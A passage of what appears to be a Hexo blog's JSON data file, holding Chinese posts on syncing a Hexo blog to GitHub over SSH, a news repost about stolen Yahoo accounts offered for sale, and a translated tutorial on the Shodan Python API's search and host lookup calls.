d”的操作中会报错，原因我就不多说了，直接执行以下命令：\n``` bash\n$ npm install hexo-deployer-git --save\n```\n再次推送即可\n\n### sign: bman","slug":"hexo博客异地同步","published":1,"date":"2017-05-31T09:00:21.512Z","updated":"2017-06-02T01:09:20.465Z","_id":"cj3f5g11c0003joo5xtvu6dpa","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"hexo-blog-异地同步\"><a href=\"#hexo-blog-异地同步\" class=\"headerlink\" title=\"hexo blog 异地同步\"></a>hexo blog 异地同步</h2><h3 id=\"问题起源\"><a href=\"#问题起源\" class=\"headerlink\" title=\"问题起源\"></a>问题起源</h3><p>很早前搭建了一个hexo的博客，用的是家里的电脑搭建的，一直只能在家里同步。于是和朋友讨论是否能在其它电脑上进行同步文件，很尴尬的一点是他成功了，而我却因为认证方式的问题一直未能进行异地同步。对于一个耿直的我来说分分钟想把这个博客撤了，内心真的是郁闷极了。看过网上有很多的类似的问题，也有和我报错相同的文章，但是都一一试过，结果还是以失败告终，真想爆一句“F**K”。通过分析发现，其实是一个登陆认证的问题；但是因为家里电脑用的是ssl登录认证，在deployer的时候并不需要输入密码。在git文件夹下翻了半天，结果都没有找到我的密码保存的目录。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>首先，在新机子上搭建博客其实就是重复搭建hexo博客的过程，关键是新机子需要和你的github建立一个认证。<br>（一）准备工作：<br>前提：根据这篇文章[<a href=\"http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</a>]<br>已经把家里pc上的内容put到github新项目中（<a href=\"https://github.com/BBB-man/myblogdate）\" target=\"_blank\" rel=\"external\">https://github.com/BBB-man/myblogdate）</a><br>1.下载<a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"external\">node.js</a>，安装，默认会安装npm</p>\n<p>2.安装<a href=\"https://github.com/git-for-windows/git/releases\" target=\"_blank\" rel=\"external\">git</a><br>注意：认证在此处出现<br>    关于github的配置，需要将新机器的SSH公钥添加到github上的<a href=\"https://github.com/settings/keys中,这里是关键。\" target=\"_blank\" rel=\"external\">https://github.com/settings/keys中,这里是关键。</a><br>输入以下命令，得到key：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git config --global user.email <span class=\"string\">\"xxxxx@gmail.com\"</span>    <span class=\"comment\">#enter your email(github registered)</span></div><div class=\"line\">$ git config --global user.name <span class=\"string\">\"xxxx\"</span>\t\t<span class=\"comment\">#enter whatever</span></div></pre></td></tr></table></figure></p>\n<p>回车到底，此时会默认在c盘中（C:\\Users\\xxx.ssh\\）目录下生成文件id_rsa/id_rsa.pub。<br><img src=\"/upload_image/id_rsa_pub.jpg\" alt=\"id_rsa.pub\"><br>然后将id_rsa.pub文件中的内容复制到github的key文本框中。<br><img src=\"/upload_image/gitkey.jpg\" alt=\"gitkey\"><br>可以通过命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ssh -T git@github.com</div></pre></td></tr></table></figure></p>\n<p>来验证一下</p>\n<p>3.安装hexo    打开cmd, 运行：npm install -g hexo</p>\n<p><em>创建一个Myblog文件夹\n</em>把github中的备份文件clone到Myblog中<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git <span class=\"built_in\">clone</span> https://github.com/BBB-man/myblogdate</div></pre></td></tr></table></figure></p>\n<p>*在Myblog中运行命令：(会产生一个hexo列表)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo init</div></pre></td></tr></table></figure></p>\n<p>*将Myblog里面的node_modules和scafflods文件复制到clone下来的myblogdate文件夹中</p>\n<p>（二）问题调试</p>\n<ol>\n<li><p>修改本地_config.yml文件的deploy配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">deploy:</div><div class=\"line\"><span class=\"built_in\">type</span>: git</div><div class=\"line\">repository: git@github.com:BBB-man/BBB-man.github.io.git   <span class=\"comment\">#这里改成这个，原先为https的</span></div><div class=\"line\">branch: master</div></pre></td></tr></table></figure>\n</li>\n<li><p>做完上述的工作，说明认证方式已经没问题了。但是因为某些原因在执行“hexo d”的操作中会报错，原因我就不多说了，直接执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>再次推送即可</p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign: bman\"></a>sign: bman</h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"hexo-blog-异地同步\"><a href=\"#hexo-blog-异地同步\" class=\"headerlink\" title=\"hexo blog 异地同步\"></a>hexo blog 异地同步</h2><h3 id=\"问题起源\"><a href=\"#问题起源\" class=\"headerlink\" title=\"问题起源\"></a>问题起源</h3><p>很早前搭建了一个hexo的博客，用的是家里的电脑搭建的，一直只能在家里同步。于是和朋友讨论是否能在其它电脑上进行同步文件，很尴尬的一点是他成功了，而我却因为认证方式的问题一直未能进行异地同步。对于一个耿直的我来说分分钟想把这个博客撤了，内心真的是郁闷极了。看过网上有很多的类似的问题，也有和我报错相同的文章，但是都一一试过，结果还是以失败告终，真想爆一句“F**K”。通过分析发现，其实是一个登陆认证的问题；但是因为家里电脑用的是ssl登录认证，在deployer的时候并不需要输入密码。在git文件夹下翻了半天，结果都没有找到我的密码保存的目录。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>首先，在新机子上搭建博客其实就是重复搭建hexo博客的过程，关键是新机子需要和你的github建立一个认证。<br>（一）准备工作：<br>前提：根据这篇文章[<a href=\"http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</a>]<br>已经把家里pc上的内容put到github新项目中（<a href=\"https://github.com/BBB-man/myblogdate）\" target=\"_blank\" rel=\"external\">https://github.com/BBB-man/myblogdate）</a><br>1.下载<a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"external\">node.js</a>，安装，默认会安装npm</p>\n<p>2.安装<a href=\"https://github.com/git-for-windows/git/releases\" target=\"_blank\" rel=\"external\">git</a><br>注意：认证在此处出现<br>    关于github的配置，需要将新机器的SSH公钥添加到github上的<a href=\"https://github.com/settings/keys中,这里是关键。\" target=\"_blank\" rel=\"external\">https://github.com/settings/keys中,这里是关键。</a><br>输入以下命令，得到key：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git config --global user.email <span class=\"string\">\"xxxxx@gmail.com\"</span>    <span class=\"comment\">#enter your email(github registered)</span></div><div class=\"line\">$ git config --global user.name <span class=\"string\">\"xxxx\"</span>\t\t<span class=\"comment\">#enter whatever</span></div></pre></td></tr></table></figure></p>\n<p>回车到底，此时会默认在c盘中（C:\\Users\\xxx.ssh\\）目录下生成文件id_rsa/id_rsa.pub。<br><img src=\"/upload_image/id_rsa_pub.jpg\" alt=\"id_rsa.pub\"><br>然后将id_rsa.pub文件中的内容复制到github的key文本框中。<br><img src=\"/upload_image/gitkey.jpg\" alt=\"gitkey\"><br>可以通过命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ssh -T git@github.com</div></pre></td></tr></table></figure></p>\n<p>来验证一下</p>\n<p>3.安装hexo    打开cmd, 运行：npm install -g hexo</p>\n<p><em>创建一个Myblog文件夹\n</em>把github中的备份文件clone到Myblog中<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git <span class=\"built_in\">clone</span> https://github.com/BBB-man/myblogdate</div></pre></td></tr></table></figure></p>\n<p>*在Myblog中运行命令：(会产生一个hexo列表)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo init</div></pre></td></tr></table></figure></p>\n<p>*将Myblog里面的node_modules和scafflods文件复制到clone下来的myblogdate文件夹中</p>\n<p>（二）问题调试</p>\n<ol>\n<li><p>修改本地_config.yml文件的deploy配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">deploy:</div><div class=\"line\"><span class=\"built_in\">type</span>: git</div><div class=\"line\">repository: git@github.com:BBB-man/BBB-man.github.io.git   <span class=\"comment\">#这里改成这个，原先为https的</span></div><div class=\"line\">branch: master</div></pre></td></tr></table></figure>\n</li>\n<li><p>做完上述的工作，说明认证方式已经没问题了。但是因为某些原因在执行“hexo d”的操作中会报错，原因我就不多说了，直接执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>再次推送即可</p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign: bman\"></a>sign: bman</h3>"},{"title":"My New Post","date":"2016-09-22T06:00:27.000Z","_content":"## The news is two months ago, just for practice.\n\"Peace\"在黑市上出售200万雅虎账号，以后在网络上不能随便填写真实信息了...\n\n## 喝口茶：\n\n### 吃点心//Info:\n“Peace” aka “Peace_of_mind”, the hacker behind the Myspace, Tumblr, Twitter and LinkedIn attacks, is allegedly selling 200 million Yahoo user details for 3 bitcoins (around $1,860) on the Real Deal, a dark web marketplace.\n\nAlthough the legitimacy of the data is still questioned, Yahoo confirmed for Motherboard that they “were aware of the claim”. The hacker claims the data is from 2012 and, similarly to his previous attacks, it contains stolen usernames, hashed passwords and birth dates.\n\nAs reported by Motherboard, following an internal investigation some of the accounts turned out to be shut off, thus the list is a mix of both disabled and legitimate accounts.\n\n“We are committed to protecting the security of our users’ information and we take any such claim very seriously. Our security team is working to determine the facts,” said a company spokesperson. “Yahoo works hard to keep our users safe, and we always encourage our users to create strong passwords, or give up passwords altogether by using Yahoo Account Key, and use different passwords for different platforms.”\n\nThe hacker had previously claimed association with a Russian group focused on tech firms, according to an interview for Wired. In spite of their unknown identity, the group is held accountable for the hacks on LinkedIn, Myspace and Russian social media channel VK.com.\n\n![Alt text](\\upload_image\\black_huoguo.jpg) \n\narticle from [google+](https://www.hotforsecurity.com/blog/peace-is-selling-200-million-yahoo-accounts-on-dark-web-16205.html)\n### Sign:B-man","source":"_posts/my-new-post.md","raw":"---\ntitle: My New Post\ndate: 2016-09-22 14:00:27\ntags:\n---\n## The news is two months ago, just for practice.\n\"Peace\"在黑市上出售200万雅虎账号，以后在网络上不能随便填写真实信息了...\n\n## 喝口茶：\n\n### 吃点心//Info:\n“Peace” aka “Peace_of_mind”, the hacker behind the Myspace, Tumblr, Twitter and LinkedIn attacks, is allegedly selling 200 million Yahoo user details for 3 bitcoins (around $1,860) on the Real Deal, a dark web marketplace.\n\nAlthough the legitimacy of the data is still questioned, Yahoo confirmed for Motherboard that they “were aware of the claim”. The hacker claims the data is from 2012 and, similarly to his previous attacks, it contains stolen usernames, hashed passwords and birth dates.\n\nAs reported by Motherboard, following an internal investigation some of the accounts turned out to be shut off, thus the list is a mix of both disabled and legitimate accounts.\n\n“We are committed to protecting the security of our users’ information and we take any such claim very seriously. Our security team is working to determine the facts,” said a company spokesperson. “Yahoo works hard to keep our users safe, and we always encourage our users to create strong passwords, or give up passwords altogether by using Yahoo Account Key, and use different passwords for different platforms.”\n\nThe hacker had previously claimed association with a Russian group focused on tech firms, according to an interview for Wired. In spite of their unknown identity, the group is held accountable for the hacks on LinkedIn, Myspace and Russian social media channel VK.com.\n\n![Alt text](\\upload_image\\black_huoguo.jpg) \n\narticle from [google+](https://www.hotforsecurity.com/blog/peace-is-selling-200-million-yahoo-accounts-on-dark-web-16205.html)\n### Sign:B-man","slug":"my-new-post","published":1,"updated":"2017-05-31T07:58:06.618Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g11k0004joo5qapwobd6","content":"<h2 id=\"The-news-is-two-months-ago-just-for-practice\"><a href=\"#The-news-is-two-months-ago-just-for-practice\" class=\"headerlink\" title=\"The news is two months ago, just for practice.\"></a>The news is two months ago, just for practice.</h2><p>“Peace”在黑市上出售200万雅虎账号，以后在网络上不能随便填写真实信息了…</p>\n<h2 id=\"喝口茶：\"><a href=\"#喝口茶：\" class=\"headerlink\" title=\"喝口茶：\"></a>喝口茶：</h2><h3 id=\"吃点心-Info\"><a href=\"#吃点心-Info\" class=\"headerlink\" title=\"吃点心//Info:\"></a>吃点心//Info:</h3><p>“Peace” aka “Peace_of_mind”, the hacker behind the Myspace, Tumblr, Twitter and LinkedIn attacks, is allegedly selling 200 million Yahoo user details for 3 bitcoins (around $1,860) on the Real Deal, a dark web marketplace.</p>\n<p>Although the legitimacy of the data is still questioned, Yahoo confirmed for Motherboard that they “were aware of the claim”. The hacker claims the data is from 2012 and, similarly to his previous attacks, it contains stolen usernames, hashed passwords and birth dates.</p>\n<p>As reported by Motherboard, following an internal investigation some of the accounts turned out to be shut off, thus the list is a mix of both disabled and legitimate accounts.</p>\n<p>“We are committed to protecting the security of our users’ information and we take any such claim very seriously. Our security team is working to determine the facts,” said a company spokesperson. “Yahoo works hard to keep our users safe, and we always encourage our users to create strong passwords, or give up passwords altogether by using Yahoo Account Key, and use different passwords for different platforms.”</p>\n<p>The hacker had previously claimed association with a Russian group focused on tech firms, according to an interview for Wired. In spite of their unknown identity, the group is held accountable for the hacks on LinkedIn, Myspace and Russian social media channel VK.com.</p>\n<p><img src=\"\\upload_image\\black_huoguo.jpg\" alt=\"Alt text\"> </p>\n<p>article from <a href=\"https://www.hotforsecurity.com/blog/peace-is-selling-200-million-yahoo-accounts-on-dark-web-16205.html\" target=\"_blank\" rel=\"external\">google+</a></p>\n<h3 id=\"Sign-B-man\"><a href=\"#Sign-B-man\" class=\"headerlink\" title=\"Sign:B-man\"></a>Sign:B-man</h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"The-news-is-two-months-ago-just-for-practice\"><a href=\"#The-news-is-two-months-ago-just-for-practice\" class=\"headerlink\" title=\"The news is two months ago, just for practice.\"></a>The news is two months ago, just for practice.</h2><p>“Peace”在黑市上出售200万雅虎账号，以后在网络上不能随便填写真实信息了…</p>\n<h2 id=\"喝口茶：\"><a href=\"#喝口茶：\" class=\"headerlink\" title=\"喝口茶：\"></a>喝口茶：</h2><h3 id=\"吃点心-Info\"><a href=\"#吃点心-Info\" class=\"headerlink\" title=\"吃点心//Info:\"></a>吃点心//Info:</h3><p>“Peace” aka “Peace_of_mind”, the hacker behind the Myspace, Tumblr, Twitter and LinkedIn attacks, is allegedly selling 200 million Yahoo user details for 3 bitcoins (around $1,860) on the Real Deal, a dark web marketplace.</p>\n<p>Although the legitimacy of the data is still questioned, Yahoo confirmed for Motherboard that they “were aware of the claim”. The hacker claims the data is from 2012 and, similarly to his previous attacks, it contains stolen usernames, hashed passwords and birth dates.</p>\n<p>As reported by Motherboard, following an internal investigation some of the accounts turned out to be shut off, thus the list is a mix of both disabled and legitimate accounts.</p>\n<p>“We are committed to protecting the security of our users’ information and we take any such claim very seriously. Our security team is working to determine the facts,” said a company spokesperson. “Yahoo works hard to keep our users safe, and we always encourage our users to create strong passwords, or give up passwords altogether by using Yahoo Account Key, and use different passwords for different platforms.”</p>\n<p>The hacker had previously claimed association with a Russian group focused on tech firms, according to an interview for Wired. In spite of their unknown identity, the group is held accountable for the hacks on LinkedIn, Myspace and Russian social media channel VK.com.</p>\n<p><img src=\"\\upload_image\\black_huoguo.jpg\" alt=\"Alt text\"> </p>\n<p>article from <a href=\"https://www.hotforsecurity.com/blog/peace-is-selling-200-million-yahoo-accounts-on-dark-web-16205.html\" target=\"_blank\" rel=\"external\">google+</a></p>\n<h3 id=\"Sign-B-man\"><a href=\"#Sign-B-man\" class=\"headerlink\" title=\"Sign:B-man\"></a>Sign:B-man</h3>"},{"title":"python--shodan","date":"2017-03-24T07:13:58.000Z","_content":"百度一下shodan：black-google，这足以表达出shodan的强大，于是乎就想研究一下shodan的搜索功能。没想到python已经有这个模块了https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。\n### 第一步：安装\n在开始在python使用shodan库之前呢，首先确保你已经注册shodan并且拿到了API key。然后才能安装并使用(这里使用pip安装)：\n``` bash\n>>>python\n>>>pip install shodan\n```\n### 连接API\n在调用接口前必须先使用shodan的API连接\n``` bash\nimport shodan\nSHODAN_API_KEY = \"insert your API key here\"\n\napi = shodan.Shodan(SHODAN_API_KEY)\n```\n### shodan搜索\n现在我们已经完成前期配置，可以使用shodan提供的API进行初步搜索：\n``` bash\n#利用try/ except 模块抓取错误，直接跳过，不影响运行\ntry:\n    #serach shodan\n    results = api.search('Apache')        # 输入搜索信息\n\n    #打印搜索结果\n    print 'Results found: %s' % results['total']\n    for result in results['matches']:\n        print 'IP: %s' % result['ip_str']\n        print result['data']\n        print ''\nexcept shodan.APIError, e:\n    print 'Error: %s' % e\n```\n通过代码，首先我们利用api对象的一个Shodan.search()方法给我们返回一个包含结果的字典信息；这里普通的shodan用户只能返回前100个结果。\n\n同时，利用该对象函数还能返回更多的信息，下面是Shodan.search()返回的部分结果：\n``` bash\n{\n        'total': 8669969,\n        'matches': [\n                {\n                        'data': 'HTTP/1.0 200 OK\\r\\nDate: Mon, 08 Nov 2010 05:09:59 GMT\\r\\nSer...',\n                        'hostnames': ['pl4t1n.de'],\n                        'ip': 3579573318,\n                        'ip_str': '89.110.147.239',\n                        'os': 'FreeBSD 4.4',\n                        'port': 80,\n                        'timestamp': '2014-01-15T05:49:56.283713'\n                },\n                ...\n        ]\n}\n```\n返回更多属性方法列表：[REST API documentation](https://developer.shodan.io/api)\n### host查询\n我们可以用shodan.host()方法来查询ip等内容信息：\n``` bash\n# Lookup the host\nhost = api.host('217.140.75.46')        #输入ip域名\n\n# Print general info\nprint \"\"\"\n        IP: %s\n        Organization: %s\n        Operating System: %s\n\"\"\" % (host['ip_str'], host.get('org', 'n/a'), host.get('os', 'n/a'))\n\n# Print all banners\nfor item in host['data']:\n        print \"\"\"\n                Port: %s\n                Banner: %s\n\n        \"\"\" % (item['port'], item['data'])\n```\n下面我罗列了几种(/shodan/host/{ip})   host.get()内部的方法属性\n{\nregion_code,ip,area_code,country_name,postal_code,dma_code,country_code,data,os,product,timestamp,asn,banner...   \n}\n\n## 总结\n首先利用python脚本来调用shodan的API还是非常方便的；在笔者看来，最麻烦的无非是确定API接口的各种属性方法。\n例如：\n``` bash\nmsg = api.host('xxx.xxx.xxx.xxx')\n\nprint \"\"\"\n        msg1: %s\n        msg2: %s\n        msg3: %s\n        msg4: %s\n        msg5: %s\n\"\"\" % (host.get('region_code', 'n/a'),host.get('area_code', 'n/a'),host.get('asn', 'n/a'),host.get('product', 'n/a'),)\n\n```\n总之，利用这些属性可以查看各种有用的信息，你懂得！！！\n\nsign:B-man\n","source":"_posts/python-shodan.md","raw":"---\ntitle: python--shodan\ndate: 2017-03-24 15:13:58\ntags:\n---\n百度一下shodan：black-google，这足以表达出shodan的强大，于是乎就想研究一下shodan的搜索功能。没想到python已经有这个模块了https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。\n### 第一步：安装\n在开始在python使用shodan库之前呢，首先确保你已经注册shodan并且拿到了API key。然后才能安装并使用(这里使用pip安装)：\n``` bash\n>>>python\n>>>pip install shodan\n```\n### 连接API\n在调用接口前必须先使用shodan的API连接\n``` bash\nimport shodan\nSHODAN_API_KEY = \"insert your API key here\"\n\napi = shodan.Shodan(SHODAN_API_KEY)\n```\n### shodan搜索\n现在我们已经完成前期配置，可以使用shodan提供的API进行初步搜索：\n``` bash\n#利用try/ except 模块抓取错误，直接跳过，不影响运行\ntry:\n    #serach shodan\n    results = api.search('Apache')        # 输入搜索信息\n\n    #打印搜索结果\n    print 'Results found: %s' % results['total']\n    for result in results['matches']:\n        print 'IP: %s' % result['ip_str']\n        print result['data']\n        print ''\nexcept shodan.APIError, e:\n    print 'Error: %s' % e\n```\n通过代码，首先我们利用api对象的一个Shodan.search()方法给我们返回一个包含结果的字典信息；这里普通的shodan用户只能返回前100个结果。\n\n同时，利用该对象函数还能返回更多的信息，下面是Shodan.search()返回的部分结果：\n``` bash\n{\n        'total': 8669969,\n        'matches': [\n                {\n                        'data': 'HTTP/1.0 200 OK\\r\\nDate: Mon, 08 Nov 2010 05:09:59 GMT\\r\\nSer...',\n                        'hostnames': ['pl4t1n.de'],\n                        'ip': 3579573318,\n                        'ip_str': '89.110.147.239',\n                        'os': 'FreeBSD 4.4',\n                        'port': 80,\n                        'timestamp': '2014-01-15T05:49:56.283713'\n                },\n                ...\n        ]\n}\n```\n返回更多属性方法列表：[REST API documentation](https://developer.shodan.io/api)\n### host查询\n我们可以用shodan.host()方法来查询ip等内容信息：\n``` bash\n# Lookup the host\nhost = api.host('217.140.75.46')        #输入ip域名\n\n# Print general info\nprint \"\"\"\n        IP: %s\n        Organization: %s\n        Operating System: %s\n\"\"\" % (host['ip_str'], host.get('org', 'n/a'), host.get('os', 'n/a'))\n\n# Print all banners\nfor item in host['data']:\n        print \"\"\"\n                Port: %s\n                Banner: %s\n\n        \"\"\" % (item['port'], item['data'])\n```\n下面我罗列了几种(/shodan/host/{ip})   host.get()内部的方法属性\n{\nregion_code,ip,area_code,country_name,postal_code,dma_code,country_code,data,os,product,timestamp,asn,banner...   \n}\n\n## 总结\n首先利用python脚本来调用shodan的API还是非常方便的；在笔者看来，最麻烦的无非是确定API接口的各种属性方法。\n例如：\n``` bash\nmsg = api.host('xxx.xxx.xxx.xxx')\n\nprint \"\"\"\n        msg1: %s\n        msg2: %s\n        msg3: %s\n        msg4: %s\n        msg5: %s\n\"\"\" % (host.get('region_code', 'n/a'),host.get('area_code', 'n/a'),host.get('asn', 'n/a'),host.get('product', 'n/a'),)\n\n```\n总之，利用这些属性可以查看各种有用的信息，你懂得！！！\n\nsign:B-man\n","slug":"python-shodan","published":1,"updated":"2017-05-31T08:58:00.774Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g11q0005joo57j6gkqgl","content":"<p>百度一下shodan：black-google，这足以表达出shodan的强大，于是乎就想研究一下shodan的搜索功能。没想到python已经有这个模块了<a href=\"https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。\" target=\"_blank\" rel=\"external\">https://shodan.readthedocs.io/en/latest/tutorial.html#connect-to-the-api，但是上面都是英文，看着不太舒服，索性就顺手翻译一下吧。</a></p>\n<h3 id=\"第一步：安装\"><a href=\"#第一步：安装\" class=\"headerlink\" title=\"第一步：安装\"></a>第一步：安装</h3><p>在开始在python使用shodan库之前呢，首先确保你已经注册shodan并且拿到了API key。然后才能安装并使用(这里使用pip安装)：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&gt;&gt;&gt;python</div><div class=\"line\">&gt;&gt;&gt;pip install shodan</div></pre></td></tr></table></figure></p>\n<h3 id=\"连接API\"><a href=\"#连接API\" class=\"headerlink\" title=\"连接API\"></a>连接API</h3><p>在调用接口前必须先使用shodan的API连接<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">import shodan</div><div class=\"line\">SHODAN_API_KEY = <span class=\"string\">\"insert your API key here\"</span></div><div class=\"line\"></div><div class=\"line\">api = shodan.Shodan(SHODAN_API_KEY)</div></pre></td></tr></table></figure></p>\n<h3 id=\"shodan搜索\"><a href=\"#shodan搜索\" class=\"headerlink\" title=\"shodan搜索\"></a>shodan搜索</h3><p>现在我们已经完成前期配置，可以使用shodan提供的API进行初步搜索：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#利用try/ except 模块抓取错误，直接跳过，不影响运行</span></div><div class=\"line\">try:</div><div class=\"line\">    <span class=\"comment\">#serach shodan</span></div><div class=\"line\">    results = api.search(<span class=\"string\">'Apache'</span>)        <span class=\"comment\"># 输入搜索信息</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">#打印搜索结果</span></div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">'Results found: %s'</span> % results[<span class=\"string\">'total'</span>]</div><div class=\"line\">    <span class=\"keyword\">for</span> result <span class=\"keyword\">in</span> results[<span class=\"string\">'matches'</span>]:</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'IP: %s'</span> % result[<span class=\"string\">'ip_str'</span>]</div><div class=\"line\">        <span class=\"built_in\">print</span> result[<span class=\"string\">'data'</span>]</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">''</span></div><div class=\"line\">except shodan.APIError, e:</div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">'Error: %s'</span> % e</div></pre></td></tr></table></figure></p>\n<p>通过代码，首先我们利用api对象的一个Shodan.search()方法给我们返回一个包含结果的字典信息；这里普通的shodan用户只能返回前100个结果。</p>\n<p>同时，利用该对象函数还能返回更多的信息，下面是Shodan.search()返回的部分结果：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">        <span class=\"string\">'total'</span>: 8669969,</div><div class=\"line\">        <span class=\"string\">'matches'</span>: [</div><div class=\"line\">                &#123;</div><div class=\"line\">                        <span class=\"string\">'data'</span>: <span class=\"string\">'HTTP/1.0 200 OK\\r\\nDate: Mon, 08 Nov 2010 05:09:59 GMT\\r\\nSer...'</span>,</div><div class=\"line\">                        <span class=\"string\">'hostnames'</span>: [<span class=\"string\">'pl4t1n.de'</span>],</div><div class=\"line\">                        <span class=\"string\">'ip'</span>: 3579573318,</div><div class=\"line\">                        <span class=\"string\">'ip_str'</span>: <span class=\"string\">'89.110.147.239'</span>,</div><div class=\"line\">                        <span class=\"string\">'os'</span>: <span class=\"string\">'FreeBSD 4.4'</span>,</div><div class=\"line\">                        <span class=\"string\">'port'</span>: 80,</div><div class=\"line\">                        <span class=\"string\">'timestamp'</span>: <span class=\"string\">'2014-01-15T05:49:56.283713'</span></div><div class=\"line\">                &#125;,</div><div class=\"line\">                ...</div><div class=\"line\">        ]</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>返回更多属性方法列表：<a href=\"https://developer.shodan.io/api\" target=\"_blank\" rel=\"external\">REST API documentation</a></p>\n<h3 id=\"host查询\"><a href=\"#host查询\" class=\"headerlink\" title=\"host查询\"></a>host查询</h3><p>我们可以用shodan.host()方法来查询ip等内容信息：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># Lookup the host</span></div><div class=\"line\">host = api.host(<span class=\"string\">'217.140.75.46'</span>)        <span class=\"comment\">#输入ip域名</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Print general info</span></div><div 